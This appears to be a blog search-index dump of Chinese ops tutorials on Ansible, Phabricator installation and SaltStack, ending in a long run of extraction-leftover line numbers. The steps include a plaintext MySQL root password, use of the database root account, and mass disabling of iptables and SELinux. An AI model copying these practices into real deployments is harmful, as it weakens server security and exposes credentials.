模块（远程主机分区挂载） 例： 1shell &gt; ansible Client -m mount -a \"name=/mnt/data src=/dev/sd0 fstype=ext4 opts=ro state=present\" service 模块（远程主机系统服务管理） 例： 123shell &gt; ansible Client -m service -a \"name=nginx state=stoped\"shell &gt; ansible Client -m service -a \"name=nginx state=restarted\"shell &gt; ansible Client -m service -a \"name=nginx state=reloaded\" user 服务模块（远程主机用户管理） 例： 12shell &gt; ansible Client -m user -a \"name=wang comment='user wang'\"shell &gt; ansible Client -m user -a \"name=wang state=absent remove=yes\" # 添加删除用户","link":"/2016/03/09/自动化+Jenkins/Ansible/ansible小结(五)常用模块/"},{"title":"Centos7搭建配置phabricator开源的可视化代码审查工具","text":"Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。公司项目管理和代码审查一直用jira和git来做,最近发现一个不错的开源的项目管理平台 自己搭建下感觉还挺好用的话就转移过来了。 简介在Phabricator中，可以非常方便的针对每一段代码进行交际讨论;负责审查的工程师可以接受代码改变，可以提出疑问要求原作者继续修改等等。 在Pharbricator中，可以新建代码仓库（也就是在phabricator中宿主仓库），也可以导入外部仓库（从外部仓库拉取数据，并跟踪该外部仓库保持数据同步，phabricator内部有一个更新机制）;支持http ，也支持ssh（不过配置比较麻烦点）; Phabricator支持两种代码审查工作流：“提交前审查”和“audit”（提交后审查）。 在Phabricator的主面板中主要有以下几个工具： 差分 - 审查代码：管理预推代码审查工作流程; Maniphest - 任务和错误：管理成员的所有任务和Bug，可对任务或Bug展开讨论; Diffusion - 主机和浏览存储库：管理代码仓库，支持Git / Hg / SVN; 审计 - 浏览和审计提交：管理后推代码审查工作流程; Phriction - Wiki：文档管理; 项目 - 组织：工程管理，可关联资源库; 源代码托管在Github 特性：代码审查（Code Review）git仓库跟踪bug项目管理团队沟通 关于phabricator更多的介绍，访问项目官网：phabricator 环境要求：Phabricator是一个LAMP应用套件，因此最基本的要求就是LAMP环境： 123456789* Linux系统环境：centos7.1 64位* Apache（或nginx，或lighttpd）：需要Apache 2.2.7以上版本。* MySQL：MySQL必需* PHP：需要PHP5.2以上版本这里我安装版本：* Apache 2.2.15* mysql 5.6.29* php 5.4.16 phabricator安装参考：官网phabricator安装 具体过程不描述，以我参考的网络资源进行说明。网上的资源参考了特别多，只放我认为最有帮助的。 首先，phabricator是基于php的，同时需要发送邮件（提醒代码审查者），所以假定服务器上已经配置好了php，mysql，nginx，postfix等环境;同时，官方推荐开启APC性能. ###1 安装MariaDB数据库 1yum install mariadb mariadb-server 启动Mariadb服务： 12systemctl start mariadbsystemctl enable mariadb 运行MySQL初始化安装脚本： 1mysql_secure_installation 默认密码为空。 这里需要配置优化my.cnf 如果默认不优化也是可以的不过安装完成以后可以看到我下面文章会出现10多个问题 大部分都是跟MySQL相关的。 配置优化MariaDB数据库：1234567vim /etc/my.cnf[mysqld]innodb_buffer_pool_size = 1600Mmax_allowed_packet = \"33554432\"sql_mode=STRICT_ALL_TABLESft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txtft_min_word_len = 3 需要执行的SQL语句：12345678910111213141516[root@Phabricator sql]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 75Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; REPAIR TABLE phabricator_search.search_documentfield;+-----------------------------------------+--------+----------+----------+| Table | Op | Msg_type | Msg_text |+-----------------------------------------+--------+----------+----------+| phabricator_search.search_documentfield | repair | status | OK |+-----------------------------------------+--------+----------+----------+1 row in set (0.00 sec) mysql 5.6安装，不过这里我最后启用的是5.6版本，原因已经说明了. 2 安装Apache1＃yum -y install httpd 配置Apache，提高一点安全性： 12sed -i 's/^/#&amp;/g' /etc/httpd/conf.d/welcome.conf # 注释掉每一行sed -i \"s/Options Indexes FollowSymLinks/Options FollowSymLinks/\" /etc/httpd/conf/httpd.conf 启动Apache web服务： 12systemctl start httpdsystemctl enable httpd 3 安装PHP和一些模块1yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process 配置优化 不然安装成功以后会出现问题错误提现❌： 12345678910111. 未配置服务器时区 [root@Phabricator sql]# vim /etc/php.ini例 ;date.timezone = 改成: date.timezone = Asia/Shanghai PHP post_max_size未配置 将PHP 配置中的post_max_size 调整为至少32MB。设置为较小值时，大文件上传可能无法正常工作。post_max_size = 32M php5.4版本可以直接使用phabricator.sh提供的脚本安装，这个脚本会检查phabricator需要的环境，没有的会自动安装，之后会安装好phabricator，安装参考phabricator安装向导. 4 安装Git1yum install git 可参考网上防火墙和selinux建议根据此文章配置一下. 如果你已经设置好LAMP环境，你可以已经获得你所需的任何东东。如何安装LAMP可以查看我写yum一键安装与卸载LAMP环境 5 下载安装Phabricator既然你已经安装以上所需的依赖环境服务，下面获取Phabricator以及其依赖包： 123456mkdir /var/www/html/cd /var/www/html/git clone https://github.com/phacility/libphutil.gitgit clone https://github.com/phacility/arcanist.gitgit clone https://github.com/phacility/phabricator.gitchown -R apache: /var/www/html/* 6 创建Apache虚拟主机配置文件1vim /etc/httpd/conf.d/phabricator.conf 写入内容： 123456789101112131415&lt;VirtualHost *:80&gt; ServerAdmin phabricator.ihaozhuo.com DocumentRoot /var/www/html/phabricator/webroot/ ServerName phabricator.ihaozhuo.com ServerAlias phabricator.ihaozhuo.com RewriteEngine on RewriteRule ^/rsrc/(.*) - [L,QSA] RewriteRule ^/favicon.ico - [L,QSA] RewriteRule ^(.*)$ /index.php?__path__=$1 [B,L,QSA] &lt;Directory /var/www/html/phabricator/webroot/&gt; AllowOverride All &lt;/Directory&gt; ErrorLog /var/log/httpd/phabricator.ihaozhuo.com-error_log CustomLog /var/log/httpd/phabricator.ihaozhuo.com-access_log common&lt;/VirtualHost&gt; ❗️❗️注意替换上面的域名。其中/var/www/html/phabricator/webroot是我的phabricator安装路径，大家使用时候换成自己的即可。安装好phabricator之后，需要使用phabricator安装目录下bin文件夹下的命令来更新下. 重启apache服务：1systemctl restart httpd 7 设置MariaDB数据库配置Phabricator连接MariaDB需要的信息： 12345cd /var/www/html/phabricator/./bin/config set mysql.host localhost ./bin/config set mysql.port 3306./bin/config set mysql.user root./bin/config set mysql.pass &lt;your-MySQL-root-password&gt; 创建数据库：出现问题： 123456789101112131415161718[root@phabricator bin]# ./storage upgradeMySQL Credentials Not ConfiguredUnable to connect to MySQL using the configured credentials. You mustconfigure standard credentials before you can upgrade storage. Run thesecommands to set up credentials: phabricator/ $ ./bin/config set mysql.host __host__ phabricator/ $ ./bin/config set mysql.user __username__ phabricator/ $ ./bin/config set mysql.pass __password__These standard credentials are separate from any administrative credentialsprovided to this command with __--user__ or __--password__, and must beconfigured correctly before you can proceed.Raw MySQL Error: Attempt to connect to root@localhost failed with error#2002: Can't connect to local MySQL server through socket'/var/lib/mysql/mysql.sock' (2). 出现这一步问题 就是因为没有配置好MySQL的连接地址信息。配置下mysql的user和pass就行。 1234567[root@Phabricator local]# cat /var/www/html/phabricator/conf/local/local.json&#123; \"mysql.pass\": \"qwde1dsdfg3.com\", \"mysql.user\": \"root\", \"mysql.port\": \"3306\", \"mysql.host\": \"localhost\"&#125; 重新初始化数据库：12345678910111213141516171819202122232425[root@Phabricator phabricator]# ./bin/storage upgradeBefore running storage upgrades, you should take down the Phabricator webinterface and stop any running Phabricator daemons (you can disable thiswarning with --force). Are you ready to continue? [y/N] yLoading quickstart template onto \"localhost:3306\"...Applying patch \"phabricator:db.packages\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentdomain.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentsite.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160707.calendar.01.stub.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160711.files.01.builtin.sql\" to host \"localhost:3306\".............Missing Keyphabricator_search search_documentfield corpus Surplus Keyphabricator_search search_documentfield key_corpus Missing Keyphabricator_worker worker_archivetask key_modified Missing KeyApplying schema adjustments...Done.Completed applying all schema adjustments. 8 查看数据库：123456789101112131415161718192021222324252627282930313233343536373839404142[root@Phabricator phabricator]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 177Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------------+| Database |+--------------------------+| information_schema || mysql || performance_schema || phabricator_almanac || phabricator_audit || phabricator_auth || phabricator_badges || phabricator_cache || phabricator_calendar || phabricator_chatlog || phabricator_conduit || phabricator_config || phabricator_conpherence || phabricator_countdown || phabricator_daemon || phabricator_dashboard || phabricator_differential || phabricator_diviner || phabricator_doorkeeper || phabricator_draft || phabricator_drydock || phabricator_fact || phabricator_feed || phabricator_file || phabricator_flag || phabricator_fund || ....... |+--------------------------+61 rows in set (0.01 sec) ❗️❗️注：upgrade之后，show databases你会发现建立了许多phabrictor开头的数据库。 ###8.1 配置URL： 未配置此安装的基本URI，并且在配置之前，主要功能将无法正常工作。您应该将基本URI设置为您将用于访问Phabricator的URI，如“http://phabricator.example.com/”。如果使用的端口不是80（http）或443（https），请包括协议（http或https），域名和端口号。基于此请求，正确的设置似乎是：http : //phabricator.ihaozhuo.com/要配置基本URI，请运行以下命令。 12[root@Phabricator phabricator]# ./bin/config set phabricator.base-uri 'http://phabricator.ihaozhuo.com/'Set 'phabricator.base-uri' in local configuration. 9 设置防火墙12firewall-cmd --zone=public --permanent --add-service=httpfirewall-cmd --reload 9.1 Phabricator Daemons Are Not Running启动守护进程1phabricator/ $ ./bin/phd start 10 完成安装配置phabricator： 123cd /var/www/html/phabricator/./bin/config set phabricator.base-uri 'http://your_domain_or_IP'./bin/phd start 使用浏览器访问：http://your_domain_or_IP 然后根据提示修复一些问题。 登录进来管理界面： 创建项目例子： Projects ——》 Create Project ——》填写好项目名称 ——》Create New Project 创建完成效果： 安装完成以后出现10多个问题解决：汉化翻译过来： ❓说明：按问题提示操作解决故障。一般都有问题修复解决方法的，官方这点还是很不错的。 棘手问题1 如果遇到这个问题：Alternate File Domain Not Configured 操作了这条命令失效 最好别操作： 123phabricator/ $ ./bin/config set security.alternate-file-domain &lt;domain&gt;[root@Phabricator phabricator]# ./bin/config set security.alternate-file-domain http://cdn.phabricator.com 如果是CDN数据存放可以使用这个命令。不然会出现访问失败。我是参考这篇文档解决问题：Phabricator not rendering resources over https删除security.alternate-file-domain可以访问。 棘手问题2 PHP Extension ‘APC’ Not Installed 参考文章：PHP Extension ‘APC’ Not Installed 123456# yum install php-pear# pecl install apc# echo \"extension=apc.so\" &gt;&gt; /etc/php.ini# echo \"apc.enabled=1\" &gt;&gt; /etc/php.ini# cp /usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)# /etc/init.d/httpd restart phabricator官网配置说明Configuration Guide 1. 身份验证提供者Phabricator登录的方法被称为身份验证提供者（Authentication Providers）。例如,当我们设置了一个”用户名/密码”身份验证提供者,那么用户可以通过传统的用户名和密码登录。Phabricator支持多种登录系统。当我们使用Administrators登录到后台之后，我们就可以启用或禁用这些Providers，配置用户如何注册或登录到Phabricator。 在公司内部使用，我们一般使用Username/Password或LDAP，对于开源项目，我们也可以使用类似于GitHub等OAuth第三方登录。在使用Username/Password登录方式时，我们还可以限制注册用户时的邮箱后缀，我们可以设置成公司的邮箱域名。 1.1 修改登录方式网页上可以对其进行相应的修改。具体位置在：左侧菜单Auth -&gt; Add Provider -&gt; username/password(账号密码方式登录)支持 账号密码登录以及第三方（facebook、github等）账号登录。另外，可以选择用户自主注册，或者禁用（管理员配置）。 这里选择LDAP同步需要安装PHP LDAP扩展： 123Before you can set up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.yum install php-ldap -y 注：如果第一次管理员登录以后，没有修改登录方式，接着退出。下次登录可能会被锁住，需要使用以下命令解锁。 1/bin/auth recover &lt;username&gt; 1.2 设置用户登录认证方式使用管理员账号登录，在左侧的菜单中选择 Auth ，然后点击右上侧 Add Provider，在列表中选则你需要的认证方式。 我选择是Username/Password的方式，即用户自己注册Phabricator账号。为了保障安全，我设置了只允许公司邮箱地址注册：Config ---&gt; Core Settings ---&gt; Authentication ---&gt; auth.email-domains。你还可以选择 auth.require-approval ，即新注册用户需要管理员批准。 1.3 设置邮件发送服务参数首先，配置 mail-adapter （邮件发送方式）：Config ---&gt; Core Settings ---&gt; Mail ---&gt; metamta.mail-adapter，我选择的是 PhabricatorMailImplementationPHPMailerAdapter ，通过SMTP的方式发送邮件。在选择完之后，需要设置SMTP服务器地址、账号和密码：Config —&gt; Core Settings —&gt; PHPMailer —&gt; metamta.mail-adapter，根据你自己邮箱的配置，相应的设置 phpmailer.smtp-host、phpmailer.smtp-port、phpmailer.smtp-protocol、phpmailer.smtp-user、phpmailer.smtp-password、phpmailer.smtp-encoding 。 2.邮箱关联切换到phabricator/bin/目录下运行daemon：./bin/phd start。 注意每次重启需要再次启用，因此建议放到启动脚本上。 配置mail：通过web访问phabricator并在页面上进行配置：（这里使用的是外部SMTP server的方式，更多方式参见phabricator docs） 用administrator账号登录后，在administration栏选择Config进入 1）选择mail，设置 metamta.default-address – xxxx@163.com // 注意：这里必须要用与smtp服务器对应的邮箱地址，不然邮件发不出去 metamta.domain -- phabricator.myproject.com // 随意 metamta.mail-adapter: set to &quot;PhabricatorMailImplementationPHPMailerAdapter&quot; metamta.send-immediately: Send Via Daemons （目前版本貌似没有） 2）选择PHPMailer，设置：（以163.com的SMTP server为例） phpmailer.mailer: set to “smtp”. （默认） phpmailer.smtp-host: smtp.163.com phpmailer.smtp-port: 25 （默认） phpmailer.smtp-user: xxxx phpmailer.smtp-password: xxxx 目前版本页面上不能配置PHPMailer，只能使用工具/bin/config工具set相对应的配置项。 123phabricator/ $ ./bin/mail list-outbound # List outbound mail.phabricator/ $ ./bin/mail show-outbound # Show details about messages.phabricator/ $ ./bin/mail send-test # Send test messages. 3. 参考：https://www.oschina.net/question/191440_125562 Phabricator入门手册 http://blog.csdn.net/zzllabcd/article/details/49997421 10.04Ubuntu安装 http://www.cnblogs.com/clovn/p/5103611.html debian7安装 https://secure.phabricator.com/book/phabricator/article/installation_guide/ 官方guider https://liuzhichao.com/p/1992.html Phabricator 实践之配置账号和注册 https://www.oschina.net/question/191440_125562 入门手册 http://www.jianshu.com/p/b1a75a14638c 简书中的分享（较为完整） http://www.cnblogs.com/ToDoToTry/p/3956687.html git server搭建指南 https://my.oschina.net/miger/blog/775609 linux平台arc工具的使用 http://blog.csdn.net/peapon/article/details/29881575 windows中arc的使用","link":"/2017/01/07/自动化+Jenkins/Phabricator/Centos7搭建配置phabricator开源的可视化代码审查工具/"},{"title":"自动化运维工具--SaltStack-分组（使用记录,groups）","text":"自动化运维工具–SaltStack-分组（使用记录,groups）在使用 SaltStack 对主机进行批量管理的时候，因为不同的服务器组所做的业务功能不同，因此为了更加方便的管理，为了便于管理功能业务相似的minion,Saltstack提供了分组的模式，因为线上机器多，不可能每次都是“*”或者“ip主机名” 这样不现实的。 所以我们现在都是提供分组，哪里的机器分哪个组这样你操作起来就方便而且容易排查，因此就自己在分组使用的过程中有以下一点记录下。 官方文档：http://docs.saltstack.com/topics/targeting/nodegroups.html 参考 SaltStack 的官方文档 4.4 Compound matchers 和 4.3. Node groups 知道，对目标服务器分组有以下七种方式，这七种方式的标示符分别为： G – 针对 Grains 做单个匹配，例如：G@os:Ubuntu E – 针对 minion 针对正则表达式做匹配，例如：E@web\\d+.(dev|qa|prod).loc P – 针对 Grains 做正则表达式匹配，例如：P@os:(RedHat|Fedora|CentOS) L – 针对 minion 做列表匹配，例如：L@minion1.example.com,minion3.domain.com or bl*.domain.com I – 针对 Pillar 做单个匹配，例如：I@pdata:foobar S – 针对子网或是 IP 做匹配，例如：S@192.168.1.0/24 or S@192.168.1.100 R – 针对客户端范围做匹配，例如： R@%foo.bar 然后我自己在做分组的时候，尝试了下 L 是否可以使用正则表达式 配置： 编辑配置文件 vi /etc/salt/master 这里大约706-714行：原文： 12345678##### Node Groups ################################################ Node groups allow for logical groupings of minion nodes. A group consists of a group# name and a compound target.#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com' 绿色的是指定组名：可以定义自己好记的组名，应用服务器是需要同样配置的，可以放在同一个分组。修改配置：注意：这里组名前面：需要空格，每个用户key名称，都逗号隔开。 12345#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: ''L@d_104_article_1,d_108_account_1,d_109_comm_1,d_110_consumer_1‘ihaozhuo2: 'L@api' 我们来测试下： -N 是指定分组名称： 执行命令 sudo salt -N “ihaozhuo1” test.ping结果为： 123456789101112[root@jumper ~]# salt -N 'ihaozhuo1' test.pingd_104_article_1: Trued_108_account_1: Trued_109_comm_1: Trued_110_consumer_1: True[root@jumper ~]# salt -N 'ihaozhuo2' test.pingapi: True 分组分好几台一起，是可以获取的。匹配指定的key 修改配置尝试一： 1234#nodegroups:# group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com and bl*.domain.com'# group2: 'G@os:Debian and foo.domain.com'ihaozhuo1: ‘ L@JF1-TEST1-001,JF1-TEST1-002 or JF-TEST1-0[0-9][0-9]' 执行命令 sudo salt -N TEST1 test.ping结果为： 123456789101112JF1-TEST1-002: TrueJF1-TEST1-001: TrueJF1-TEST1-003: TrueJF1-TEST1-004: TrueJF1-TEST1-006: TrueJF1-TEST1-005: True 匹配了所有指定的key. 使用 L 列表的方式，必须把 minion 列出来，或者是列出几台后，在后面接 or 或者 and 表达式， or 或者 and 后面接的表达式后面可以使用正则表达式。 注：想使用正则表达式，最好的方式就是使用E","link":"/2015/11/01/自动化+Jenkins/saltstack/自动化运维工具--SaltStack-分组（使用记录,groups） /"},{"title":"自动化运维工具--Saltstack写sls语法批量部署zabbix_agent","text":"Saltstack批量部署zabbix_agent服务12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576epel_install: file.managed: - name: /root/zabbix-release-2.4-1.el6.noarch.rpm ## 指定节点的epel安装包的存放路径 - source: salt://epel/zabbix-release-2.4-1.el6.noarch.rpm ## 指定从master的哪个位置拷贝epel的rpm包 - user: root ## 文件的拥有者 - group: root ## 文件的所属组 - mode: 777 - backup: minion cmd.run: - name: rpm -ivh /root/zabbix-release-2.4-1.el6.noarch.rpm ## 执行rpm包的安装 - unless: test -f /etc/yum.repos.d/epel.repo ## 如果存在这个文件就不再执行安装程序 - require: - file: epel_installSELINUX: cmd.run: - name: service iptables stop &amp;&amp; chkconfig iptables off &amp;&amp; setenforce 0 #sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config - require: - file: epel_installcache_yum: cmd.run: - name: yum makecache ## 生成yum的缓存 - require: - file: epel_install ## 生成缓存要在epel安装之后zabbix-agentd: pkg.installed: [] service.running:# - name: zabbix-agent# - running - enable: True - reload: True - watch: - file: /etc/zabbix/zabbix_agentd.conf - require: - file: epel_install/etc/zabbix/zabbix_agentd.conf: file.managed: - source: salt://zabbix/zabbix_agentd.conf - user: zabbix ## 文件的拥有者 - group: zabbix ## 文件的所属组 - mode: 644 - backup: minion - template: jinja - require: - file: epel_installntp: pkg.installed: [] ## 安装ntp # name: ntp service.running:# name: ntpd# running enable: True reload: True watch: file: /etc/ntp.conf require: ## 安装ntp要在epel安装之后 file: epel_install/etc/ntp.conf: file.managed: - source: salt://ntp/ntp.conf - user: root ## 文件的拥有者 - group: root ## 文件的所属组 - mode: 644 - backup: minion - require: - file: epel_install","link":"/2015/11/01/自动化+Jenkins/saltstack/自动化运维工具--Saltstack写sls语法批量部署zabbix_agent/"},{"title":"自动化运维工具-服务自动化部署平台之Saltstack总结","text":"服务自动化部署平台之Saltstack总结Saltstack是一个新的基础设施管理工具。目前处于快速发展阶段，可以看做是强化的Func+弱化的Puppet的组合。间接的反映出了saltstack的两大功能：远程执行和配置管理。 SaltStack 保持了输入、输出、配置文件的一致性，所有文件均使用YAML格式。主要负责配置管理和远程执行（在远程主机运行预定义或任意的命令，也叫远程执行，这是 Salt的核心功能。接下来的链接展示了模块（module）和返回器（returner），这是远程执行的关键所在。） Salt是基于python写的经典C/S框架的自动化部署平台。由Master和Minion构成，通过ZeroMQ进行通信。 Master与Minion认证 1.minion 在第一次启动时，会在/etc/salt/pki/minion/（该路径在/etc/salt/minion里面设置）下自动生成 minion.pem(private key)和minion.pub(public key)，然后将minion.pub发送给master。 2.master 在接收到minion的public key后，通过salt-key命令accept minion public key，这样在master的/etc/salt/pki/master/minions下的将会存放以minion id命名的public key, 然后master就能对minion发送指令了。 Master与Minion的连接 Saltstack master启动后默认监听4505和4506两个端口。4505(publish_port)为salt的消息发布系统，4506(ret_port) 为salt客户端与服务端通信的端口。如果使用lsof查看4505端口，会发现所有的Minion在4505端口持续保持在ESTABLISHED 参考文档: http://blog.javachen.com/2013/11/18/study-note-of-saltstack/ 经典搭建框架http://www.linuxyw.com/179.html salt搭建参考 http://blog.halfss.com/blog/2013/05/22/yun-wei-zi-dong-hua-zhi-saltxue-xi-bi-ji/ salt的安装： master端： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#yum install salt-master -y salt主控端安装#vim /etc/salt/master salt主配置文件修改interface: 服务监听IPauto_accept: True（可选，key通过‘salt-key -a keyname’命令手动进行认证）注意：keyname 就是客户端中设置的id标识(可以查看salt-minion端的配置)#salt-master -l debug debug模式，查看salt都进行哪些操作#/etc/init.d/salt-master restart 重启salt服务#/etc/init.d/salt-master status 查看状态#netstat -antlp | grep 4505 确保消息发布端口正常#netstat -antlp | grep 4506 确保客户端与服务端通信端口正常#/etc/init.d/salt-master restart# /etc/init.d/salt-master status# salt-key 查看认证相关信息# salt-key -a wy-pe2 手动添加认证key(给wy-pe2主机添加认证)#iptables -F 关闭防火墙以免影响认证#salt-key -a wy-pe2#salt-key -L 查看认证信息(会有显示已经认证和未认证的相关信息)[root@wy-pe1 ~]# salt-key -LAccepted Keys:wy-pe2 已经允许的key(表示wy-pe2已经允许认证了)Unaccepted Keys:Rejected Keys:#cd /etc/salt/pki/master/minions 在master中的minions目录中生成认证的key#setenforce 0 暂时关闭selinux#/etc/init.d/salt-master restart执行远程命令(使用salt内建的模块):#salt ‘wy-pe2′ test.ping 测试master和minion进行通信(在master端进行ping响应测试)[root@wy-pe1 ~]# salt ‘wy-pe2′ test.ping 如果能ping通，则为Truewy-pe2:True#lsof -i:4505 查看到minion端都和4505保持建立[root@wy-pe1 ~]# lsof -i:4505COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEsalt-mast 8568 root 12u IPv4 63217 0t0 TCP *:4505 (LISTEN)salt-mast 8568 root 14u IPv4 65101 0t0 TCP wy-pe1:4505-&gt;wy-pe2:51237 (ESTABLISHED)(表示建立连接了)注意:如果认证那块没做好，就会影响相关的链接 Salt客户端安装： minion端安装配置： 12345678910111213141516171819202122232425#yum install salt-minion -y#vim /etc/salt/minion 修改minion客户端主配置master: 服务端主机名id: 客户端主机名(其实也就是认证key的名字) 用来和master进行认证#/etc/init.d/salt-minion restart 重启服务#cd /etc/salt/pki/minion/ 在这个目录底下会生成两个认证文件(minion.pub minion.pem)salt-minion端不能正常启动的解决步骤:（一般就是iptables和selinux的影响）#/etc/init.d/salt-minion restart# tail -f /var/log/messages#/etc/init.d/salt-minion restart#iptables -F#tail -f /var/log/salt/minion#salt-minion -l debug#setenforce 0#/etc/init.d/salt-minion restart安装完毕，在master和minion认证完毕之后会在minion主机上的/etc/salt/pki/minion/目录底下生成新的minion_master.pub问题1：档master和minion进行认证的时候，master没有接收到public key(minion)(这个在后来的链接过程中会造成master和minion不能链接)问题2：辅机salt-minion总是在查看服务状态的时候显示失败(but pid exits！)# salt-minion -l debug 查看salt客户端详细信息 salt的简单使用：12345salt可以直接让minion执行模块命令，也可以直接执行shell命令1.salt -C ‘wy-pe1 and wy-pe2 or wy-peN’ test.ping -C表示多参数(表示在测试多台主机的存活状态)# salt ‘*’ disk.usage 查看磁盘使用情况(使用内建模块查看所有minion端的磁盘使用情况)#salt ‘*’ cmd.run ‘df -h’ 使用cmd.run直接调用远程shell命令(功能同上)# salt ‘*’ cmd.run “cat /root/lall” 查看客户端主机的/root/lall文件 2.nodegroup对minion进行分组：123456789nodegroups:group1: ‘L@foo.domain.com,bar.domain.com,baz.domain.com or bl*.domain.com’group2: ‘G@os :Debian and foo.domain.com’group3:’wy-pe2′进行分组测试：# salt -N group3 test.pingwy-pe2:True 3.grains对minion基本信息的管理：12salt ‘wy-pe2′ grins.ls 查看grains分类salt ‘wy-pe2′ grins.items 查看minnon基本信息(硬件参数) ###4.pillar对敏感信息的管理，只有匹配到的节点才能获取和使用 1234567891011121314151617181920212223242526272829303132默认pillar数据定义文件存储路径:/srv/pillar状态管理：1.salt基于minion进行状态的管理(state)类似于pupet的pp文件功能，salt的state文件扩展文件名为.sls,采用的是和puppet一样的设计思路。即以master端的文件状态来确定minion端的一些状态信息设置。(安装的软件包，服务的运行状态以及需要同步的文件配置)注意：salt默认的根目录在/srv/salt中，如果没有需要进行建立。top.sls：这个文件类似于puppet的site.pp文件，作为“最高同步”操作的入口文件，执行“最高同步”操作时，将从此sls文件中获取状态对minion进行同步示例：(注意，salt文件完全采用ymal格式，对代码的缩进有着严格的要求)#vim /srv/salt/servers_package.slshttpd: 项目名pkg: 类型– installed 动作(表示安装httpd包)service:– running– enable:Truevim-enhanced:pkg:– installedtomcat环境openjdk-7-jdk:pkg:– installedtomcat7:pkg:– installed– require:– pkg: openjdk-7-jdk# salt ‘wy-pe2′ state.sls servers_package 按照sls文件中的配置对wy-pe2进行服务配置 管理配置文件123456789101112131415161718192021222324252627282930313233343536373839httpd:pkg:– installedfile.managed: 文件管理(文件同步操作)– name: /etc/httpd/conf/httpd.conf– source: salt://httpd/httpd.conf# salt ‘wy-pe2′ state.highstate 应用修改(给minion永久添加状态)3.使用salt schedule对minion进行实时更新，让minion自觉的保持某个状态4.实时管理有时候我们需要临时的查看某个机器上的某个文件，或者执行某个命令cmd.run方式：(salt ‘$targeting’ cmd.run ‘$cmd’)用来远程执行shell命令# salt ‘wy-pe2′ cmd.run ‘ifconfig eth0′ 查看某台主机的网络接口cmd.script方式：可以向远程主机执行脚本#salt ‘*’ cmd.script salt://useradd.sh 向minion主机上执行useradd.sh脚本(salt://是salt的默认发布目录，即/srv/salt)pkg.install方式：制定主机安装软件#salt ‘wy-pe2′ pkg.install vsftpd 指定主机安装软件# salt ‘*’ network.interfaces 查看远程主机接口# salt-cp ‘wy-pe2′ salt-cmd /home/xxb2 复制文件到指定的系统上(当前目录的salt-cmd)salt是主命令，一般用来执行命令模块。salt-cp用来复制文件到制定的系统上去salt-key用来和minion之间进行身份验证salt-master为服务端的主守护进程用于控制minionsalt-run为前端命令执行module方式：(模块查看方式#salt ‘*’ sys.doc)#salt ‘*’ disk.usage 查看磁盘使用情况# salt ‘*’ grains.item os/osrelease/oscodename# salt ‘*’ user(group).info xxb2# salt ‘*’ ip.get_interface eth0#salt ‘*’ lvm.vgdisplay salt相关管理命令：12345salt-run manage.up 查看存活的minionsalt-run manage.down 查看死掉的minionsalt-run manage.down removekeys=True 查看down掉的minion，并将其删除salt-run manage.status 查看minion的相关状态salt-run manage.versions 查看slat的所有master和minion的版本信息 附录：salt详细使用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319